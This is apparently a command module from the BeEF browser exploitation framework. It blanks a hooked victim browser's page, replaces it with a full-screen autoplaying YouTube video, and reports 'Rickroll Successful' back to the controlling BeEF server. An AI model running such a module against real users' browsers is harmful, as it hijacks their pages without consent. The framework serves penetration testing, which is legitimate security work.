//
// Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {
	$j('body').html('');

	$j('body').css({'padding':'0px', 'margin':'0px', 'height':'100%'});
	$j('html').css({'padding':'0px', 'margin':'0px', 'height':'100%'});
	
	$j('body').html('<object width="100%" height="100%"><param name="movie" value="http://www.youtube.com/v/oHg5SJYRHA0?fs=1&amp;hl=en_US&amp;autoplay=1&amp;iv_load_policy=3"><param name="allowFullScreen" value="true"><param name="allowscriptaccess" value="always"><embed src="http://www.youtube.com/v/oHg5SJYRHA0?fs=1&amp;hl=en_US&amp;autoplay=1&amp;iv_load_policy=3" type="application/x-shockwave-flash" allowscriptaccess="always" allowfullscreen="true" width="100%" height="100%"></object>');
	
	beef.net.send("<%= @command_url %>", <%= @command_id %>, "result=Rickroll Successful");
});
